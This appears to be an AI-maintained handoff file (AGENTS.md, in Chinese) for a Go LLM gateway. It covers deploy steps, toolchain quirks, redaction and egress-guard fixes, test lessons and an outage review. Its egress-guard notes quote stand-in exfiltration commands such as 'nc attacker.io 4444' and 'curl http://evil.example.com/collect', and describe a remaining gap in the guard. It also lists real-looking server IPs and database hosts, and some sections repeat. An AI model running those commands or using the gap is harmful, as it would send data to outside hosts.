# llm-gateway-go — AGENTS.md（维护者交接）

> 适用：未来任何 cold-start 切到本仓库的助手会话（不区分会话身份）。
> 写入时机：2026-10-09 首次生成；**2026-10-11 由 root 会话
> `mvs_d10f8ded3e7c4d73b8221fe670ddd9dc` 重写「工具链」与「已落地结论」两节**，
> 原文件关于「go/brew/docker 全部缺失」的判断已被实测推翻，见下。
> 上下文：脱敏范围事故（地址被遮蔽成 `[REDACTED]`）的修复、245 部署验证与
> 随后的批判性审计。

## 仓库快照

- 路径：`/Users/niuer/workspace/ai-native-tools/llm-gateway/llm-gateway-go-cursor`
  （本机为独立 checkout；`/Users/niuer/workspace/ai-native-tools/llm-gateway/llm-gateway-go`
  是**另一份并发 checkout**，两边同时 deploy 会互相抢 245 的部署锁）
- 远端：codeup.aliyun.com（`origin/main`）
- HEAD：见 `git log --oneline -1`。**不要照抄本文件的 commit 列表**——仓库多会话共享，
  本文件记录时点之后通常已有他人提交；以 `git log` 为准。
- 分支：仅 `main`；提交前先 `git fetch && git status -sb`
- Go 模块：见仓库根 `go.mod`
- 入口二进制：`cmd/gateway/main.go`（v1）、`cmd/gateway-v2/main.go`（v2，独立）

## 本机工具链（2026-10-11 实测，原「全部缺失」的结论已作废）

| 工具 | 状态 | 说明 |
|---|---|---|
| `go` | `~/sdk/go/bin/go` 1.27.1 | **不在 PATH 上**，跑任何 go 命令前 `export PATH="$HOME/sdk/go/bin:$PATH"` |
| `bash` ≥4 | `~/sdk/bash5/bin/bash` 5.2.0 | 系统只有 3.2，deploy-lib 用到 `${var^^}`（bash 4+）必须用这个。**2026-10-11 下午曾被整目录清掉**（`~/sdk/` 只剩 go/caddy/缓存），已按下方重编法重建回原路径——`~/sdk/` 下的工具可能被清理，用前先 `ls` 确认 |
| `pnpm` | `corepack prepare pnpm@10.29.2` | 仓库 `packageManager` 锁 10.29.2 |
| `node` | nvm 24.21.0 | 在 PATH 上（22.23.3 已被升级替代） |
| `brew` / `docker` | **确实缺失** | 真库回归（full 模式）仍做不了；host-first 本地部署不依赖它们 |
| `psql` | `~/kaixuan/pg18/bin/psql` | host pg18 自带；**不在 PATH 上**，或跑部署时把该目录加进 PATH |

> bash 5.2 若需重编：`~/sdk/bashbuild/bash-5.2`。构建时
> `builtins/psize.sh` 的 `mktemp` 会被沙箱 wrapper 污染，生成物 `pipesize.h`
> 会混入 `mavis-trash:` 字样导致编译失败（`unknown type name 'mavis'`）。
> 已把该脚本改为直接输出固定值 `PIPESIZE 65536`。重编时注意这一点。

## 端口：必须现场确认，不要假设

两台机器都是蓝绿部署，监听端口由 `/opt/llm-gateway-go/run/active-upstream.conf`
决定，nginx 用 `upstream llm_local { include … }` 引用。

- 2026-10-10 实测：154 与 245 均在 `:8782`。
- 2026-10-11 实测：**245 的活跃端口漂到了 `:8782`**（deploy handoff 输出
  `active_port=8782`），`:8781` 无监听。部署期间发生过与另一份 checkout 的并发部署。

探活一律两个端口都试：`curl -s http://127.0.0.1:{8781,8782}/readyz`。
直连 8781 得到 connection refused **不代表故障**，只代表端口没在用。

## SSH：必须走别名，不能用裸 IP

`~/.ssh/config` 里 `245` / `154` / `252` 都配了 **`Port 25022`**。
用 `ssh root@8.136.114.245`（裸 IP）会走 22 端口并被对端在 KEX 阶段断开，
表现为 `Connection closed by ... port 22` —— 看起来像目标机挂了，实际是端口错了。
**一律用 `ssh 245` / `ssh 154` / `ssh 252`。**

## 本轮已落地：脱敏范围事故

用户报告会话里出现 `export https_proxy=http://[REDACTED]:7890`。分析发现是
**三条互相独立的遮蔽链路各自在遮地址**，只修一条不够：

1. `security/sanitize` 的 `server_ip`/`internal_ip` —— 一条规则同时承担
   「替换请求文本敏感值」与「判定模型是否外传」两个职责。已引入
   `DetectionScope` 拆分：`ScopeRedact`（默认，不含地址）/ `ScopeEgress`
   （仅 tool 参数防外传守卫用）。
2. `pii_patterns.ip_address` —— 316 迁移播种的 DB 规则，正则宽到连环回与
   版本号一并命中。已由 **851 迁移**停用（UPDATE 非 DELETE：316 是幂等播种，
   删行会被重放种回来）。
3. `domains/outputcompliance` 的 `detectInternalIP` 默认动作 redact。
   已改为 `log`：**只撤遮蔽、不撤检出**，审计台账仍看得到命中。

遮蔽标记同步改为带类型：`[REDACTED:phone]` / `[REDACTED:secret]`。

分析与变异验证详见 `docs/audit/2026-10-10-脱敏范围与遮蔽标记.md`。

## 判据设计的硬教训（本轮最贵的两条）

1. **判据必须与被测函数在同一层。** r1014 第一版把断言写在 SSE 流式链上，
   对核心逻辑的极端变异（豁免恒 false / 恒 true）**0 条失败** —— 全绿但无效。
   改判据时又把 `arguments` 写成 JSON 对象而非 JSON 字符串字面量，整帧非法
   JSON、守卫压根走不到检查，公网用例反而全绿。改用 `unsafeToolValue`
   直接驱动守卫判定入口后才可信。
2. **用内置 `NewPatternDetector()` 写的地址类判据一律是假绿。** fallback 的
   `defaultPatternEntries` 里**没有任何地址规则**，所以这类判据不可能失败。
   地址相关判据必须用 `NewPatternDetectorFromFile("../../configs/sensitive_patterns.yaml")`。
   r1010 那条就是这么漏掉了私网阻断的真实缺陷（dc63f19ff 修复）。
3. **「没被阻断」有两种成因，必须把「看不见」单独判掉。** 允许侧用例绿，可能是
   （a）命中豁免放行，也可能是（b）检测器压根没匹配到该地址。b 是假绿，且
   **变异验证也测不出来**（因为它没有改逻辑，只改了「看不见的范围」）。
   2026-10-11 实测：把 `server_ip` 正则收窄成只匹配 `127.*` 后，
   `TestR1014NonExfiltrationAddressesAreNotBlocked` **依然全绿**，
   而新增的 `TestR1014AllowedAddressesAreActuallyDetected` 红了 7 条。
   凡是有「允许侧」判据，都配一条「前提仍在场」的断言。
4. **证明「既有失败与我无关」有两种强度，别混着用。** 强：`git worktree add` 到
   pristine HEAD 复跑（admin 3 条用的是这个）；弱：`go list -deps` 确认目标包
   不依赖被改包（`domains/hooks/handoff` 的 `Test244WideningRuleShrinksGap`
   用的是这个——它不依赖 `security/sanitize`，所以我的改动在因果上不可能影响它）。

写完判据后**必须做变异验证**（把被测逻辑改坏，确认判据变红），否则不知道它
是否真的在测东西。

## 剩余任务

- ~~**154 生产未部署本次改动**~~ —— **2026-10-11 实测推翻，已作废**。
  原文称「154 的 `pii_patterns` 是独立库，迁移需单独执行」，这是**错的**：
  154 与 245 指向**同一个** PostgreSQL（`172.16.2.210:5432/llm_gateway`，
  键名是 `LLM_GATEWAY_DATABASE_URL`，**不在** `/etc/llm-gateway-go/env` 之外的
  `LLM_GATEWAY_DB_DSN` 里——按后者 grep 会一无所获，这是个坑）。
  实测：154 运行 `2533-3cac0431`，二进制指纹确认含本轮全部修复
  （2026-10-11 午后复核：该二进制是 stripped ELF，「函数符号指纹」已不可复现；
  五修复在 2533 的证据改由配置指纹锚定，见下方「午后批判式复核」节）；
  `pii_patterns.ip_address`=disabled、`schema_migrations` 有 851、
  `session_summaries` 60 列，两台机共享这一份结果，端到端 8/8 通过。
  DB 侧**不存在**「各跑各的迁移」这回事，改一处两边同时生效。
- ~~**域名形式的外传目标从不被拦**~~（`curl http://evil.example.com/collect`
  不触发阻断）：`ScopeEgress` 只匹配 IP 规则。**r1016 已修**（域名只在 URL 主机位
  识别，不做裸点分词，否则 `cat README.md`、`v1.2.3` 全会被误判），**r1017 补齐
  残留的裸主机+端口形态**（**该形态已于 r1018 撤除**，见下）。
  **两者已随 2026-10-11 16:34 的 2537（154）/2539（245）
  上线**——那两轮部署由并行会话执行，`37099db2` 是本仓提交，含 r1016/r1017。
  线上复验：`/v1/models` 对伪造 `sk-` token 已返回 401（修复前 200 + 615 个模型）。
  **关键设计**：默认公网可达即阻断，只豁免明确不可路由的主机
  （`.local/.internal/.cluster.local/.lan/.home.arpa` 等 + 单标签名）。
- ★ **r1016/r1017 自身引入过两类大面积误伤（r1018 已修正，教训值得单独记）**：
  r1016 的 `user@host` 正则把 `npm install lodash@4.17.21`、`go get x@v1.2.3`、
  `cargo add serde@1.0.197` 等**装包命令整类阻断**（pkg@1.2.3 被当成 user@host，
  且 `4.17.21` 走默认公网判定）；r1017 的「裸主机+空格+端口」正则把
  `node server.js 8080`、`python3 main.py 100` **打死**。两条规则已撤除——
  前者冗余（email 规则 + isNonExfiltrationEmailFragment 已覆盖），
  后者与脚本调用**结构上不可区分**，默认阻断方向就是错的。
  **教训**：把「锚定上下文」当成充分条件是错的——锚定之后那段文本**仍然未必是
  主机**（`pkg@1.2.3` 的 `4.17.21`、`main.py` 都不是）。判据见
  `TestR1017VersionSpecsAndScriptArgsAreNotDestinations`，谁再往提取器里加
  「长得像主机」的形态会先撞上它。
  **残留缺口**：`nc attacker.io 4444`、`curl evil.io/path`（无 scheme）仍放行。
  **2026-10-11 深夜已在两台生产实测确认**（245 `2546-97e833a1`、154
  `2547-97e833a1`，全路径端到端 13/14 通过，唯一未通过项就是这个残留缺口）。
  要收口它的唯一自洽方向是**命令动词表**，不要再加形态枚举。
- ~~**email 形状的 `user@host` 误阻断内网目标**~~：`ssh deploy@build.corp.internal`
  整条 `output_policy_blocked`，而 `ssh ops@10.24.7.91` 放行——**同一操作，写 IP
  放行、写内网域名阻断**，与 dc63f19ff 同构。**r1017 已修**：豁免按**类型**分派，
  邮箱的主机部分交回主机可达性判定（`isNonExfiltrationFragment` 单一入口）。
- ~~**`/v1/models` 对任意 `sk-` 字符串开放**~~：`Bearer sk-totally-bogus` 能拿到
  全量 615 个模型清单，同一 token 在 `/v1/chat/completions` 上正确 401。
  **根因是委托链断了一节**：`middleware/auth_mw.go` 规定 sk-* 由各 handler 自行
  调 `KeyVerifier`（Rule 20 §2），`ModelsHandler` 从未接上，中间件为内部调用者开
  的门于是对外敞开。**r1017 已修**。排查这类问题记住：**中间件放行 ≠ 已鉴权**，
  凡是 `/v1/*` 路由都要确认对应 handler 自己调了校验器。

## 本机工具链（2026-10-11 实测，原「全部缺失」的结论已作废）

1. `1127a3e3c`：合并主提交 + 冲突解决（`admin/dashboard_board_queries.go` 保留上游降级契约 + 探针排除积分源）
2. `df69ef0be`：`scripts/deploy-local-lib.sh` macOS timeout 可移植性修复（`timeout → gtimeout → 纯 bash 轮询看门狗`，轮询实现避免子 shell sleep 孙进程变孤儿拖满时限）
3. `7fd9b2ceb`：`tests/deploy_timeout_portability_test.sh` 回归门接入 `verify.sh`；7 套 deploy-local 测试 `rc=0`；变异验证确认有牙
4. `22e5e3f8f`：`scripts/deploy-lib` 软链 SSOT 路径迁移（`ai-native-tools/deploy-lib` → `ai-native-workspace/deploy-lib`，与本机实际 SSOT 一致）
5. `7817f1c1a`：审计 pass（2026-10-10 23:30）——`go build`/`go vet`/`security/*`+`streaming/*` 9 包全绿；**第九之二节「占位符 fail-open 透传」经 9 种拼写变体探针复验确认已不复现**（当前 HEAD 全程 fail-closed），该节结论已更正；仓库卫生干净。审计结论详见 `docs/audit/2026-10-10-sanitize-e2e-154-multimodel-report.md` 第二十节
6. **2026-10-11 审计 pass（24h 修正任务审计与完善）**，详见 `docs/audit/2026-10-11-24h-audit-pass.md`。拉取 `182ce34b1`（6 提交）快进合并后，发现并修复三族问题：
   - **installer 五点同步缺口**：851 缺 main.go go:embed/map 登记（e47c1102b 只做了半个同步）、849/850 完全没同步——补齐后重新生成 `sql/schema/installed_startup_migrations.tsv`，installer 模块 13 包全绿；
   - **通道腿整段漏登 845-851**（存量八连红）：按 842 先例补登进 `scripts/apply-db-revision-sequence.sh` 的 files 数组，`apply-db-revision-sequence_test.sh` rc=0；
   - **admin 过时测试 vs authz-first**：4b06bd50b（窗口内）给 `handleUsers` 加路由级 `requireUserManager` 后漏改 2026-06-28 的两个旧断言——改为「未授权 403 + 已授权 400/405」双断言，admin 子集仅剩已知负向闸门红。
   - 另实测：`./domains-stats/...` 是本文件历史笔误（git 全历史无此路径，实为 `./domains/stats/...`），已在本文件更正；web-mobile 7169 / web 2401 前端测试全绿。
7. **2026-10-11 下午本地部署审计轮**（本会话）。拉取 7 提交快进后审计本机
   host-first 部署，修复四族问题并重新部署 2.5.8.2538：
   - **孤儿网关**：2533 轮遗留 4 个跨版本孤儿（PPID=1、无监听、两个以
     pool-closed 半死态刷错误日志 12h+）。根因是 `stop_instance` 只发 TERM
     不等待且 cutover 重试后旧 pid 失去 pidfile 引用。修复：TERM→轮询(10s)
     →KILL 升级 + 部署收尾 `reap_stray_gateways`（模式锚定部署根，不误伤
     其他 checkout）；行为回归门 `tests/deploy_local_reap_test.sh` 已接入
     verify.sh（zombie-aware 判活；三个变异验证全红在正确断言）。
   - **迁移 517 在 host-first 从零建库必炸**：534 重建后 `handoff_logs` 是
     RANGE(created_at) 分区父表，PG 不允许不含分区键的唯一约束，517 的
     `REFERENCES handoff_logs(id)` 必然 `no unique constraint`（生产是
     「先 517 后 534」的历史顺序才没炸）。修复：FK 改 DO 块按 relkind 形态
     探测——分区父表引用 `handoff_logs_hot(id)`，heap 形态保持
     `handoff_logs(id)`；canonical 与 installer embeddata 双点同步；两种
     形态 + fail-fast + 幂等四项验证通过。
   - **环境漂移**：`~/.ssh/config` 丢失（245/154/252 别名全失效，`ssh 252`
     会被解析成 IP 0.0.0.0.252）——已从
     `ai-native-workspace/docs/win11/ssh-config-fleet.txt` 恢复；
     `~/sdk/bash5` 被清——已重编（psize.sh 固定 PIPESIZE 65536 的坑再次确认）。
   - **部署轮验证**：2538 上线后 127.0.0.1:8782 / mesh 8782 / mesh 8443
     (caddy) / 公网 443 SNI→252:9443→mesh 8782 四入口全绿，**收尾零孤儿
     进程**（新机制首次实战生效）。


> bash 5.2 若需重编：`~/sdk/bashbuild/bash-5.2`。构建时
> `builtins/psize.sh` 的 `mktemp` 会被沙箱 wrapper 污染，生成物 `pipesize.h`
> 会混入 `mavis-trash:` 字样导致编译失败（`unknown type name 'mavis'`）。
> 已把该脚本改为直接输出固定值 `PIPESIZE 65536`。重编时注意这一点。

## host-first 本地部署（2026-10-11 落地，本仓 llm-gateway-go-2）

0. **陈旧分支清理（窗口外遗留，下轮顺手项）**：本地分支 `fix/sanitize-mutation-tolerant-restore`（d47f52703，10-08）已被已合并的 v2（`fix/sanitize-mutation-tolerant-restore-v2`，7cbf65478）取代，远端引用已被 prune——下轮确认后 `git branch -D` 即可。

### 任务 1 — 编译 / vet / gofmt / 单元测试

**前置**：`export PATH="$HOME/sdk/go/bin:$PATH"`（Go 1.27.1 已就位，无需安装）。

```bash
go build ./...
go vet ./...
gofmt -l <你改的文件>                    # 无输出即过
CGO_ENABLED=0 go test \
  ./security/... ./domains/outputcompliance/... ./domains/streaming/... \
  ./proxy/... ./settings/...
```

> **注意**：原文档写的 `./domains-stats/...` 在本仓库**不存在**
> （`lstat ./domains-stats/: no such file or directory`），别照抄。
>
> **`gofmt -l .` 有大量存量未格式化文件，这是上游长期状态，不是你的回归。**
> 不要全量格式化——巨型 diff 会在多会话共享仓库里制造冲突面。
>
> **已知失败（与改动无关，先在 pristine `origin/main` 上复现再判定）**：
> `admin` 的 `TestV1BodiesReadersAreAssessed`（维护者故意红的负向闸门，判据是
> 「登记表覆盖全部 bodies 读方」）、`TestHandleUsersPasswordRoute_Rejects*`
> （2 条）、`domains/hooks/handoff` 的 `Test244WideningRuleShrinksGap`。
> 2026-10-11 在 pristine origin/main 上实测这 4 条**一模一样地红**。
> `verify.sh` 在 `set -e` 下无条件 `go test ./...`，因此主门长期为红是
> 维护者策略，不要改 CI 或加白名单。

**已验证绿的子集**（2026-10-11 审计实测，`CGO_ENABLED=0 go test`，rc=0）：

| 包 | 耗时 |
|---|---|
| `security/sanitize` | ~5s |
| `security/armor` `guardian` `sensitive` | ok |
| `domains/outputcompliance` | ~0.5s |
| `domains/streaming` | ~168s |
| `domains/streaming/executors` | ~51s |
| `proxy` / `settings` | ok |
| `domains/streaming/{integrity,state,executors/webcookie}` | ok |

sanitize / streaming 这条线在当前 HEAD 是全绿的，可直接作为改动后的回归门。

**已知故意红的负向闸门，不要修复也不要加白名单**（维护者策略）：

- `admin/request_logs_bodies_retirement_gate_test.go` 中的 `TestV1BodiesReadersAreAssessed`：27 文件 / 39 调用点，故意红，判据是「登记表覆盖全部 bodies 读方」。

**主门长期红的原因与对策**：

- `verify.sh` 在 `set -e` 下无条件 `go test ./...`；CI 上 `verify-ci.yml` 未对主作业
  加 `continue-on-error`。在故意红的负向闸门下，主门长期为红。这是**维护者策略**，
  不是回归，不要主动改 CI 或加白名单；任务 1 走的是上面那个子集，可在不上 CI 的
  情况下给出「非负向闸门子集全绿」的事实。

### 任务 2 — lite 模式本地冒烟（最低门槛）

**前置**：仅 Go + SQLite（无需 docker / Postgres / Redis）。

**步骤**：

```bash
LLM_GATEWAY_STORAGE_MODE=lite \
LLM_GATEWAY_SQLITE_PATH=/tmp/gateway-lite.db \
LLM_GATEWAY_SECRET_KEY=local-smoke-test-key \
LLM_GATEWAY_CORS_ORIGINS='*' \
bash scripts/start-lite.sh
# 等待 /healthz 返回 ready=true
curl -fsS http://localhost:8781/healthz
# 也可显式指 host：curl -fsS http://<host>:8781/healthz
# 本地 lite 走 v1(:8781)。远程机器端口另见仓库快照处的蓝绿端口说明。
```

预期：服务可启动；坏/缺凭据访问数据面应被 **fail-closed 拒绝**。两个必需 env
是 r1017 前后的 fail-closed 门加出来的，缺一不可（2026-10-11 实测，原文档的
`LLM_GATEWAY_LITE_DB_PATH` 变量名已过时，脚本认 `LLM_GATEWAY_SQLITE_PATH`）：

- `LLM_GATEWAY_SECRET_KEY`：缺了直接拒启——「lite mode requires data-plane
  authentication」（静态 key / keystore snapshot / 显式 ALLOW_UNAUTHENTICATED 三选一）。
- `LLM_GATEWAY_CORS_ORIGINS`：缺了启动 panic——CORS 必须显式配置（fail-closed）。

实测 fail 行为（都正确，不是放行）：无鉴权存储时 `/v1/models`、
`/v1/chat/completions` 返回 **503**（`database_unavailable` / 
`executor_unavailable`），坏 `sk-` key 拿不到模型清单；`/admin/users` 返回 200
但内容是 SPA 静态 HTML（前端路由 fallback），admin 数据在 `/api/admin/*` 后面。

`start-lite.sh` 内部走 `go run ./cmd/gateway`，等价于直接 `go run ./cmd/gateway` 加 lite 环境变量。

> **本机 Go 不在 `PATH` 上。** 工具链在 `~/sdk/go/bin/go`（1.27.1），
> 同类非标准前缀还有 `~/sdk/bash5/bin/bash`（5.2.0）。
> 跑任何 `go` 命令前先 `export PATH="$HOME/sdk/go/bin:$PATH"`。
> 参见第十九节：非标准前缀目录是本仓多次「某依赖不存在」误判的直接原因。

### 任务 3 — 真库回归（full 模式）

**前置**：安装 docker desktop（或 orbstack）+ Postgres + Redis。`brew` 不在时可用纯 docker run。

**示例**（macOS，无 brew）：

```bash
docker run -d --name llmgw-pg    -e POSTGRES_******************* -p 5432:5432 postgres:16
docker run -d --name llmgw-redis                                       -p 6379:6379 redis:7
```

**步骤**：

```bash
LLM_GATEWAY_STORAGE_MODE=full \
LLM_GATEWAY_DB_DSN='postgres://[REDACTED]@[REDACTED]:5432/postgres?sslmode=disable' \
LLM_GATEWAY_REDIS_ADDR=[REDACTED]:6379 \
bash scripts/deploy-local.sh
bash scripts/post-deploy-verify.sh     # SSOT 在 ~/workspace/ai-native-workspace/deploy-lib
```

连接信息与管理员凭据由用户侧决定，建议写 `.env.local`（不入 git）。

### 任务 4 — deploy-local 全链路回归门

```bash
bash scripts/deploy_timeout_portability_test.sh   # rc=0
bash tests/deploy_local_contract_test.sh           # 仅在 SSOT 在场时跑（CI runner 上不存在，会挂主门，因此本轮未接入 verify.sh）
```

## 关键约束

- **合并需符合业务逻辑**：避免重复实现功能；保留上游降级契约，使用探针排除的积分源。
- **测试断言需剥离注释后再比对**；按 helper 参数化（不要内联字符串）。`goFuncBody` 已重命名为 `goFuncBodyStrict` 修复与上游测试文件重名问题。
- **部署脚本 macOS timeout 可移植**：禁止裸 `timeout` 调用，必须走 `scripts/deploy-local-lib.sh` 暴露的 `_dl_timeout` 封装。
- **回归门设计**：`tests/deploy_timeout_portability_test.sh` 零外部依赖，含静态断言（禁裸 timeout 调用并报行号）+ 行为断言（仅在确实无 `timeout` / `gtimeout` 时跑）。
- **CGO**：测试**子集**（admin/bg/domains/stats/settings）用 `CGO_ENABLED=0` 避免环境问题；`./cmd/...` 与 `./db/...` 必须开 CGO（SQLite 驱动），见任务 1 的 CGO 边界说明。
- **依赖安装属用户侧决策**：本助手不做越权安装。
- **负向闸门不擅自加白名单**：维护者裁决。
- **SSOT 软链**：`scripts/deploy-lib` 已迁移到 `ai-native-workspace/deploy-lib`。其他机器拉到此 commit 后按需 rebind：
  - 若仍在 `ai-native-tools/` 下：`git checkout HEAD~1 -- scripts/deploy-lib`
  - 若也已迁到 `ai-native-workspace/`：无需任何操作

## 仓库内 `handoff` 命名的语义警告

仓库内 `domains/streaming/handoff_*`、`domains/hostedtask/handoff.go`、`admin/handoff_logs_handler.go`、`settings/handoff_specs.go` 中的 "handoff" 都是**业务流交接**（流式分块确认、托管任务交接、settings 1m 契约测试），不是"会话间交接"。下次遇到用户口语"用 handoff 技能把提示词放到会话里"这种说法，按本 `AGENTS.md` 对待；不要调用任何 builtin 名为 handoff 的工具（builtin 列表里也没有）。

## 新增迁移的同步纪律（2026-10-11 补记，845-851 八连红的教训）

新 canonical 迁移（`sql/migrations/startup/NNN_*.sql`）落地时，**五点 installer 同步**
（embeddata 副本、main.go go:embed 变量 + embeddedSQLFiles map、dbinit StartupFiles、
豁免 parity map——见 `TestCanonicalStartupMigrationsAtOrAbove704AreRegistered` 的报错文案）
**和通道腿登记**（`scripts/apply-db-revision-sequence.sh` 的 files 数组，除非明确落入
该测试的某张豁免表）**缺一不可**。两类缺口的形态都出现过：只做 installer 漏 main.go
（851，e47c1102b）、只做 installer 漏通道（845-848，8429b1524）。判别命令：

```bash
bash scripts/apply-db-revision-sequence_test.sh   # 通道腿 + installer 腿对账，rc=0
cd installer && go test ./...                     # 五点同步对账 + 重新生成 TSV 用 -run TestStartupManifest -update
```

## 新增迁移的同步纪律（2026-10-11 补记，845-851 八连红的教训）

新 canonical 迁移（`sql/migrations/startup/NNN_*.sql`）落地时，**五点 installer 同步**
（embeddata 副本、main.go go:embed 变量 + embeddedSQLFiles map、dbinit StartupFiles、
豁免 parity map——见 `TestCanonicalStartupMigrationsAtOrAbove704AreRegistered` 的报错文案）
**和通道腿登记**（`scripts/apply-db-revision-sequence.sh` 的 files 数组，除非明确落入
该测试的某张豁免表）**缺一不可**。两类缺口的形态都出现过：只做 installer 漏 main.go
（851，e47c1102b）、只做 installer 漏通道（845-848，8429b1524）。判别命令：

```bash
bash scripts/apply-db-revision-sequence_test.sh   # 通道腿 + installer 腿对账，rc=0
cd installer && go test ./...                     # 五点同步对账 + 重新生成 TSV 用 -run TestStartupManifest -update
```

## 已落地的回归门

```bash
bash tests/deploy_timeout_portability_test.sh        # rc=0；失败即 deploy-lib 出现裸 timeout
bash scripts/apply-db-revision-sequence_test.sh      # rc=0；失败即迁移投递腿登记缺口
cd installer && go test ./...                        # rc=0；失败即 installer 同步缺口
```

期望 `rc=0`；失败即 deploy-lib 出现了裸 `timeout` 调用或未走 `_dl_timeout` 封装。

## 部署 245 的实操（2026-10-11 全程走通）

```bash
export PATH="$HOME/sdk/bash5/bin:$HOME/sdk/go/bin:$HOME/.nvm/versions/node/v22.23.3/bin:$PATH"
export AIAN_DEPLOY_LIB="$HOME/workspace/ai-native-tools/deploy-lib"   # 见下方 SSOT 说明
cd <本 checkout>
bash scripts/deploy-245.sh --seq <seq>          # seq 必须自增且不与他人撞
```

踩过的坑：

1. **系统 bash 3.2 跑不了 deploy-lib**（`${target^^}` 是 bash 4+ 语法，报
   `bad substitution`）。必须用 `~/sdk/bash5/bin/bash`。
2. **前端要自己先构建**：`web/dist` 与 `web-mobile/dist` 缺失时 deploy 会
   refuse。先 `corepack prepare pnpm@10.29.2 --activate`，再在两个前端目录
   各跑 `pnpm install --frozen-lockfile && pnpm build`。
3. **`scripts/deploy-lib` 是相对软链**，在本 checkout 里指向
   `../../ai-native-workspace/deploy-lib`（**不存在**），实际 SSOT 在
   `~/workspace/ai-native-tools/deploy-lib`。要么 `export AIAN_DEPLOY_LIB=...`
   指过去，要么用 `scripts/deploy-lib-resolve.sh`。
4. **部署锁会与并发 checkout 抢**：`/tmp/kx-llm-gateway-deploy-245.lock`。
   锁元数据里能看到持有者 pid 与 checkout 来源。**别用 `--force` 硬抢**——
   等待即可（实测等待约 3 分钟后对方完成）。硬抢会打断对方的蓝绿切换，
   留下一半状态（245 的 8781 曾因此掉线）。
5. **部署会改脏工作区**：`VERSION`、`version.json`、`web/public/version.json`、
   `web/public/menu-config.json`、`docs/db-changelog.md` 每次 deploy 都被改写。
   提交前 `git checkout --` 掉它们，别把部署产物混进提交。
6. **部署后端口可能不是 8781**：handoff 输出里的 `active_port` 才是权威值。

### SSOT 软链的真实情况

**2026-10-11 晚间复测更正（多 checkout/多机事实不同，用前必须实测）**：
下午那轮「ai-native-tools 已从本机消失、软链解析有效」的记录**对本
checkout（llm-gateway-go）不成立**——22:xx 实测：`ai-native-tools/deploy-lib`
**在场**、`ai-native-workspace/deploy-lib` **不在**，本 checkout 的
`scripts/deploy-lib` 软链（目标 `../../ai-native-workspace/deploy-lib`）**断链**
（deploy_local_contract_test 在 cd 软链处挂）。下午的记录可能出自另一份
checkout 或当时目录状态确有变化（同日 `~/sdk/bash5` 确被清过一次）。
**结论不变的部分**：任何会话跑 deploy 相关脚本前先 `ls` 确认两处 SSOT
哪个在场，用 `AIAN_DEPLOY_LIB` 指向在场的那个；软链 rebind 仍留维护者裁决。

### host-first 本地部署的 2538 轮新坑（2026-10-11 下午实测）

1. **显式 DSN 会把 `DL_DB_MODE` 定成 `external`，跳过 host claim 的
   `dl_export_host_bin_path` PATH 注入**——部署中段直接 die 在
   `psql is required for database verification`。对策：跑部署的 shell
   自带 `PATH="$HOME/kaixuan/pg18/bin:$HOME/kaixuan/redis/bin:..."`。
2. **ZCode 会话的嵌套 bash 环境里 `netstat -an` 输出缺整个 TCP/LISTEN 表**
   （只剩 Multipath/LOCAL/kernel 段；`lsof -iTCP` 正常；真终端里 netstat
   正常——02:44 同机部署过此关）。`dl_redis_host_listen_ports` 靠 netstat
   枚举端口 → `dl_redis_try_host` 恒失败 → die `no usable PostgreSQL/Redis`。
   对策（不改产品代码）：`export LLM_GATEWAY_DATABASE_URL=postgresql://huangxt@127.0.0.1:54318/llm_gateway?sslmode=disable
   LLM_GATEWAY_REDIS_ADDR=127.0.0.1:6379`——发现链 Tier 1 caller 显式配置
   最优先，完全绕开 netstat 探测。这也顺带解释了 2533/2534 轮与 2538 轮
   行为差异：探测成败取决于跑部署的 shell 环境，不在代码。
3. 2538 起部署收尾多了孤儿网关清扫（见「已完成」2026-10-11 下午审计轮）；
   `run/gateway.build` 是每次部署的构建暂存产物，属正常残留，不用手工清。

---

# 追加：2026-10-11 154/252 事故与批判式审计（root 会话 `mvs_771078044a9a4dc8960546e26f653367`）

## ⚠️ 先更正本文件上方一处我自己的错误结论

上一轮我断言「本机只有 bash 3.2，没有 bash 4+，deploy-lib 的 `${var^^}` 阻塞部署，
需打补丁副本绕过」。**该结论是错的**：我只查了 `/opt/homebrew/bin`、`/usr/local/bin`、
`/bin` 就下了判断，漏了 `~/sdk/`。

实测（2026-10-11）：

```bash
~/sdk/bash5/bin/bash --version        # GNU bash 5.2.0
~/sdk/bash5/bin/bash -c 't=154; echo "HOST_${t^^}_ROOT"'      # HOST_154_ROOT  ✅
~/sdk/bash5/bin/bash -c 'set -euo pipefail; a=(); printf "[%s]\n" "${a[@]}"'  # []  ✅
# 对照 /bin/bash 3.2：bad substitution / unbound variable
```

⇒ **deploy-lib 不需要任何修改，也不需要打补丁副本**。用
`~/sdk/bash5/bin/bash scripts/deploy-154.sh` 即可，两个构造都正常。
上方「部署 245 的实操」一节已经写对了，本条只是提醒别再重复我这个误判。

## 本会话 checkout 与上方记录不一致

上方「仓库快照」写的是 `llm-gateway-go-cursor`，**本会话实际在
`llm-gateway-go-5`**。这是第三份 checkout（与 `-cursor`、无后缀那份并发）。
部署锁会互相抢，提交前务必 `git fetch && git status -sb`。

## 154/252 事故（已修复并验证）

根因是单条链：`scripts/252-monitor/pg17-disk-watch.sh` 每 10 分钟被 cron 拉起，
但既无单实例锁也无任何超时。PG「半死」时 psql 永久挂起、副本只增不减 →
内存耗尽触发内核 OOM → 15:54:42 杀掉 llmgw Redis（`exit=137`，已 crash-loop 4 次）
与 PG 后端 → PG 对 154 返回 `57P03` → 一小时 194 个 503。

现场峰值：load **334**、进程 **3012**、副本 **310** 份、僵死 `docker exec psql` **154** 个、
`du` 卡 D 状态 11 个、swap **4095/4095 全占**、`oom_kill` 累计 414。

处置后实测：load 334→**14.5**、进程 3012→**508**、Redis 6389 恢复、`docker exec` 可用。
详见 `scripts/252-monitor/README.md` §11（事故）与 §12（对其自身修复的批判式审计）。

已推送：`b6e38b709`（两道闸）、`aba353243`（web-mobile lockfile）、
`11f46052c`（部署身份 2522）、`c88bc79e3`（审计修复 5 个缺陷）。

## ★ 154 的 503 主线：口径已修正，实况大幅好转（2026-10-11 午间复测）

**上轮本节的「50-69% 失败率」口径是错的**，三类噪音混进了 `success` 列的统计：
探针自身失败（`probe_direct_*`，6h 约 3090 条被记进 request_logs）、
**invalid_key 401 风暴**（6h 1566 条——一批失效 `sk-*` key 在 09:36-09:38
集中轮换重试，已自停）、以及 transient/provider_error 等。真实口径：

- HTTP 503 ≈ **2.5%**（网关日志 2000 条中 49 条）；真实路由失败
  （no_candidate/no_candidates）6h 仅 143 条；11 时真实成功率约 75%。
- claude-opus-5 的失败 95% 是 401 风暴连带，`fp_slot_saturation_critical` 已缓解。
- `health_auto_recover` 11:26 捞回 97 个凭据绑定，自愈在正常工作。

